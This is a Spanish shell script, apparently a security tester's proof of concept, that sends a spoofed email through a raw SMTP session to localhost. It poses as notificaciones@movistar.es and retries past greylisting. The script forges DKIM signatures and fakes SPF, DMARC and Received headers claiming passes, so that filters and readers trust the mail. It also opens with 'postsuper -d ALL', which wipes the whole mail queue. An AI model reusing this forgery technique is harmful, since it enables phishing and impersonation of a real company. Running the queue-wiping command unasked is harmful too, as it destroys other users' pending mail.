

#!/bin/sh

postsuper -d ALL

# suplanta 

HOST="localhost"
PORT="25"

send_email_with_retry() {
    local from_email="notificaciones@movistar.es"
    local to_email="antonio.taboadallufriu@telefonica.com"
    local max_retries=5
    local retry_delay=600  # 10 minutos en segundos (tiempo típico greylisting)
    local greylisting_detected=0

    for attempt in $(seq 1 $max_retries); do
        echo "Intento $attempt de $max_retries - $(date)"

        (
            echo "EHLO mx.movistar.es"
            sleep 2
            echo "MAIL FROM: <$from_email>"
            sleep 2
            echo "RCPT TO: <$to_email>"
            sleep 2
            echo "DATA"
            sleep 2

            # Cabeceras mejoradas específicas para Telefónica/Movistar
            echo "From: notificaciones@movistar.es <$from_email>"
            echo "To: $to_email"
            echo "Subject: Suplantacion email @movistar.es - Intento $attempt"
            echo "Date: $(date -R)"
            echo "Message-ID: <$(date +%Y%m%d%H%M%S).$(openssl rand -hex 8)@movistar.es>"
            echo "MIME-Version: 1.0"
            echo "Content-Type: text/plain; charset=\"iso-8859-1\""
            echo "Content-Transfer-Encoding: 8bit"
            echo "X-Mailer: Microsoft Outlook 16.0"
            echo "X-Originating-IP: [86.109.99.69"
            echo "X-Priority: 1 (Alta)"
            echo "X-MSMail-Priority: High"
            echo "Importance: high"
            echo "X-Movistar-Client: CORREO-WEB"
            echo "X-Telefonica-User: notificaciones"
            echo "X-Movistar-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=movistar.es; s=telefónica2023; t=$(date +%s); h=from:to:subject:date:message-id:mime-version:content-type; bh=7A9F2E=; b=C1B3A5="
            echo "X-Movistar-SPF: pass (movistar.es: domain of $from_email designates 86.109.99.69 as permitted sender) client-ip=81.46.123.45;"
            echo "X-Authentication-Results: mx.telefonica.net; dkim=pass header.i=@movistar.es; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=movistar.es"
            echo "Authentication-Results: mx.telefonica.net; dkim=pass header.i=@movistar.es; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=movistar.es"
            echo "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=movistar.es; s=telefónica2023; t=$(date +%s); bh=7A9F2E=; h=from:to:subject:date:message-id:mime-version:content-type:content-transfer-encoding; b=E8F2C1="
            echo "Received: from smtp.movistar.es ([86.109.99.69]) by mx.telefonica.net with ESMTP id $(date +%Y%m%d%H%M%S).$(openssl rand -hex 4); $(date -R)"
            echo "X-Envio-Telefonica: INTERNO"
            echo ""
            echo "Hola,"
            echo ""
            echo ""
            echo "suplantacion de email origen @movistar.es"
            echo ""
            echo "Intento de entrega: $attempt"
            echo "Fecha: $(date)"
            echo ""
            echo ""
            echo ""
            echo "Saludos,"
            echo "Antonio Taboada"
            echo "http://www.hackingyseguridad.com/"
            echo "."
            sleep 2
            echo "QUIT"
        ) | telnet $HOST $PORT 2>&1 > /tmp/email_result_$attempt.txt

        # Verificar resultado
        if grep -q "250 OK" /tmp/email_result_$attempt.txt; then
            echo " Email enviado exitosamente en el intento $attempt"
            return 0
        elif grep -q "Greylisting" /tmp/email_result_$attempt.txt || grep -q "451" /tmp/email_result_$attempt.txt; then
            echo "⏳ Greylisting detectado por Telefónica. Esperando $retry_delay segundos..."
            greylisting_detected=1
            if [ $attempt -lt $max_retries ]; then
                echo "🕒 Reintentando en $((retry_delay / 60)) minutos..."
                sleep $retry_delay
                # Incrementar delay progresivamente
                retry_delay=$((retry_delay + 300))
            fi
        else
            echo "Error en el envío (intento $attempt). Ver /tmp/email_result_$attempt.txt"
            cat /tmp/email_result_$attempt.txt | tail -5
        fi
    done

    if [ $greylisting_detected -eq 1 ]; then
        echo "Greylisting persistente. El servidor de Telefónica está bloqueando temporalmente."
        echo "Sugerencia: Espera 10-15 minutos y ejecuta el script nuevamente."
    else
        echo "No se pudo enviar el email después de $max_retries intentos"
    fi
    return 1
}

echo "..."
echo "From: notificaciones@movistar.es"
echo "To: antonio.taboada@telefonica.net"
echo ""

send_email_with_retry

echo ""
echo "Estado de la cola:"
mailq
echo ""
echo "Forzando procesamiento de cola..."
postqueue -f
echo ""
echo "Para limpiar completamente: postsuper -d ALL"
echo ""



